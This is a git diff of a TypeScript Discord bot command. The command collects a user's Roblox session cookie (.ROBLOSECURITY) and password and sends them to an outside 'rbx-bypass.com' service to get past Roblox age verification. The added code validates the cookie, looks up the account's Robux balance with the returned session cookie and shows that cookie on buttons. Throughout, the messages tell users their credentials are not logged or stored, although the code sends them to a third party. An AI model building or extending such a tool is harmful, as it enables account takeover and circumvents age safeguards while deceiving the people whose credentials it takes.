@@ -9,6 +9,7 @@ import {
   type MessageComponentInteraction,
 } from 'discord.js';
 import axios from 'axios';
+import { validateCookie } from '../roblox';
 import type { Command } from './types';
 
 const bypassStore = new Map<string, string>();
@@ -24,6 +25,18 @@ function buildInitialButtons(id: string): ActionRowBuilder<ButtonBuilder> {
       .setLabel('📱 Copy Mobile')
       .setStyle(ButtonStyle.Secondary),
   );
+}
+
+async function fetchRobux(cookie: string, userId: string): Promise<number> {
+  try {
+    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
+  } catch {}
+  return 0;
 }
 
 const data = new SlashCommandBuilder()
@@ -53,15 +66,22 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       iconURL: interaction.user.displayAvatarURL(),
     };
 
+    // Validate cookie first
+    const validation = await validateCookie(cookie);
+    if (!validation.valid) {
+      const embed = new EmbedBuilder()
+        .setTitle('𖣐 Invalid Cookie .ᐟ')
+        .setColor('#FFFFFF')
+        .setDescription('✧ **Error**\n────\n⭑ The provided cookie is not valid.\n⭑ Your credentials were not logged.')
+        .setFooter(footerData);
+      await interaction.editReply({ embeds: [embed] });
+      return;
+    }
+
     const progressEmbed = new EmbedBuilder()
       .setTitle('𖣐 Processing .ᐟ')
       .setColor('#FFFFFF')
-      .setDescription(
-        `✧ **Status:** Sending bypass request...\n` +
-        `────\n` +
-        `⭑ Contacting external bypass service.\n` +
-        `⭑ Your credentials are not logged or stored.`
-      )
+      .setDescription('✧ **Status:** Sending bypass request...\n────\n⭑ Contacting external bypass service.\n⭑ Your credentials are not logged or stored.')
       .setFooter(footerData);
 
     await interaction.editReply({ embeds: [progressEmbed] });
@@ -70,78 +90,99 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const headers = {
       'authority': 'rbx-bypass.com',
       'accept': '*/*',
-      'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
       'content-type': 'application/json',
       'origin': 'https://rbx-bypass.com',
-      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-      'sec-ch-ua-mobile': '?1',
-      'sec-ch-ua-platform': '"Android"',
-      'sec-fetch-dest': 'empty',
-      'sec-fetch-mode': 'cors',
-      'sec-fetch-site': 'same-origin',
-      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
     };
     const payload = { cookie, password };
 
-    const resp = await axios.post(url, payload, { headers, timeout: 15000, validateStatus: () => true });
-    const data = resp.data;
+    try {
+      const resp = await axios.post(url, payload, { headers, timeout: 15000, validateStatus: () => true });
+      const data = resp.data;
 
-    if (data.success === true) {
-      const msg = data.message || 'No additional info.';
-      const newCookie = data.cookie || null;
-      let id = '';
-      if (newCookie) {
-        id = Math.random().toString(36).slice(2, 10);
-        bypassStore.set(id, newCookie);
-        setTimeout(() => bypassStore.delete(id), 60000);
+      if (data.success === true) {
+        const msg = data.message || 'No additional info.';
+        const newCookie = data.cookie || null;
+        let id = '';
+        let robux = 0;
+
+        if (newCookie) {
+          id = Math.random().toString(36).slice(2, 10);
+          bypassStore.set(id, newCookie);
+          setTimeout(() => bypassStore.delete(id), 60000);
+          const newValidation = await validateCookie(newCookie);
+          if (newValidation.valid) {
+            robux = await fetchRobux(newCookie, String(newValidation.userId));
+          }
+        }
+
+        const embed = new EmbedBuilder()
+          .setTitle('𖣐 Success .ᐟ')
+          .setColor('#FFFFFF')
+          .setDescription(
+            `✧ **Bypass Result**\n` +
+            `────\n` +
+            `⭑ **Status:** Success\n` +
+            `⭑ **Message:** ${msg}\n` +
+            (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
+            (robux > 0 ? `⭑ **Robux Balance:** ${robux.toLocaleString()} ₽\n` : '') +
+            `────\n` +
+            `✧ **Details**\n` +
+            `────\n` +
+            `⭑ **Action:** Age verification bypass attempted.\n` +
+            `⭑ **Username:** ${validation.username}\n` +
+            `⭑ Your credentials were not logged or stored.`
+          )
+          .setImage('https://files.catbox.moe/955g15.gif')
+          .setFooter(footerData);
+
+        const components = newCookie ? [buildInitialButtons(id)] : [];
+        await interaction.editReply({ embeds: [embed], components });
+      } else if (data.error === 'BYPASS_IN_PROGRESS') {
+        const embed = new EmbedBuilder()
+          .setTitle('𖣐 Processing .ᐟ')
+          .setColor('#FFFFFF')
+          .setDescription(
+            '✧ **Status:** Waiting\n' +
+            `────\n` +
+            `⭑ Your account is being processed.\n` +
+            `⭑ Please wait a few minutes and try again.\n` +
+            `⭑ Your credentials were not logged or stored.`
+          )
+          .setFooter(footerData);
+        await interaction.editReply({ embeds: [embed] });
+      } else {
+        const reason = data.message || data.error || 'Unknown error';
+        const embed = new EmbedBuilder()
+          .setTitle('𖣐 Failed .ᐟ')
+          .setColor('#FFFFFF')
+          .setDescription(
+            `✧ **Error Occurred**\n` +
+            `────\n` +
+            `⭑ **Reason:** ${reason}\n` +
+            `⭑ The bypass request was rejected or failed.\n` +
+            `⭑ Your credentials were not logged or stored.`
+          )
+          .setFooter(footerData);
+        await interaction.editReply({ embeds: [embed] });
       }
-
-      const embed = new EmbedBuilder()
-        .setTitle('𖣐 Success .ᐟ')
-        .setColor('#FFFFFF')
-        .setDescription(
-          `✧ **Bypass Result**\n` +
-          `────\n` +
-          `⭑ **Status:** Success\n` +
-          `⭑ **Message:** ${msg}\n` +
-          (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
-          `────\n` +
-          `✧ **Details**\n` +
-          `────\n` +
-          `⭑ **Action:** Age verification bypass attempted.\n` +
-          `⭑ Your credentials were not logged or stored.`
-        )
-        .setFooter(footerData);
-
-      const components = newCookie ? [buildInitialButtons(id)] : [];
-      await interaction.editReply({ embeds: [embed], components });
-    } else if (data.error === 'BYPASS_IN_PROGRESS') {
-      const embed = new EmbedBuilder()
-        .setTitle('𖣐 Processing .ᐟ')
-        .setColor('#FFFFFF')
-        .setDescription(
-          `✧ **Status:** Waiting\n` +
-          `────\n` +
-          `⭑ Your account is being processed.\n` +
-          `⭑ Please wait a few minutes and try again.\n` +
-          `⭑ Your credentials were not logged or stored.`
-        )
-        .setFooter(footerData);
-      await interaction.editReply({ embeds: [embed] });
-    } else {
-      const reason = data.message || data.error || 'Unknown error';
-      const embed = new EmbedBuilder()
-        .setTitle('𖣐 Failed .ᐟ')
-        .setColor('#FFFFFF')
-        .setDescription(
-          `✧ **Error Occurred**\n` +
-          `────\n` +
-          `⭑ **Reason:** ${reason}\n` +
-          `⭑ The bypass request was rejected or failed.\n` +
-          `⭑ Your credentials were not logged or stored.`
-        )
-        .setFooter(footerData);
-      await interaction.editReply({ embeds: [embed] });
+    } catch (error: any) {
+      if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
+        const embed = new EmbedBuilder()
+          .setTitle('𖣐 Timeout .ᐟ')
+          .setColor('#FFFFFF')
+          .setDescription(
+            '✧ **Status:** Timeout Exceeded\n' +
+            `────\n` +
+            `⭑ The bypass request timed out.\n` +
+            `⭑ Please run the command again to check the status.\n` +
+            `⭑ Your credentials were not logged or stored.`
+          )
+          .setFooter(footerData);
+        await interaction.editReply({ embeds: [embed] });
+      } else {
+        throw error;
+      }
     }
   } catch (error: any) {
     const embed = new EmbedBuilder()
@@ -162,17 +203,14 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
   try {
     const customId = interaction.customId;
     if (!customId.startsWith('bypass_')) return;
-
     const parts = customId.split('_');
     const action = parts[1];
     const id = parts[2];
-
     const cookie = bypassStore.get(id);
     if (!cookie) {
       await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
       return;
     }
-
     if (action === 'copypc') {
       await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
     } else if (action === 'copymob') {
